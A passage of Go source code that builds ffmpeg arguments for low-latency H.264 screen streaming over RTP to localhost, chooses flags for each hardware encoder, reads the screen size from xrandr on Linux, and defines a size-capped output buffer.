		"format=yuv420p")
	args = append(args, "-vf", strings.Join(filters, ","))
	if settings.Differential {
		args = append(args, "-fps_mode", "vfr")
	}
	args = append(args, encoderFFmpegArgs(settings.Encoder, level)...)
	gop := settings.FPS * 2
	args = append(args,
		"-g", fmt.Sprintf("%d", gop),
		"-keyint_min", fmt.Sprintf("%d", gop),
		"-pix_fmt", "yuv420p",
		"-b:v", fmt.Sprintf("%dk", settings.BitrateKbps),
		"-maxrate", fmt.Sprintf("%dk", settings.BitrateKbps),
		"-bufsize", fmt.Sprintf("%dk", settings.BitrateKbps*2),
		"-an",
		"-f", "rtp",
		"-pkt_size", "1200",
		fmt.Sprintf("rtp://127.0.0.1:%d", rtpPort),
	)
	return args, nil
}

func encoderFFmpegArgs(encoder, level string) []string {
	switch encoder {
	case "h264_nvenc":
		return []string{"-c:v", "h264_nvenc", "-preset", "p4", "-tune", "ll", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_qsv":
		return []string{"-c:v", "h264_qsv", "-preset", "veryfast", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_amf":
		return []string{"-c:v", "h264_amf", "-usage", "ultralowlatency", "-quality", "speed", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	case "h264_videotoolbox":
		return []string{"-c:v", "h264_videotoolbox", "-realtime", "true", "-profile:v", "baseline", "-level:v", level, "-bf", "0"}
	default:
		return []string{"-c:v", "libx264", "-preset", "veryfast", "-tune", "zerolatency",
			"-profile:v", "baseline", "-level:v", level, "-bf", "0",
			"-sc_threshold", "0", "-x264-params", "repeat-headers=1"}
	}
}

// linuxScreenSize asks xrandr for the first connected output; an empty result
// falls back to the requested stream dimensions.
func linuxScreenSize() string {
	out, err := exec.Command("xrandr", "--current").Output()
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(line, " connected") {
			continue
		}
		for _, field := range strings.Fields(line) {
			if strings.Contains(field, "x") && strings.Contains(field, "+0+0") {
				size := strings.SplitN(field, "+", 2)[0]
				if strings.Contains(size, "x") {
					return size
				}
			}
		}
	}
	return ""
}

type cappedBuffer struct {
	buf bytes.Buffer
	max int
}

func (b *cappedBuffer) Write(p []byte) (int, error) {
	n := len(p)
	if b.max > 0 && b.buf.Len() < b.max {
		remaining := b.max - b.buf.Len()
		if len(p) > remaining {
			p = p[:remaining]
		}
		_, _ = b.buf.Write(p)
	}
	return n, nil
}

func (b *cappedBuffer) String() string {
	return b.buf.String()
}
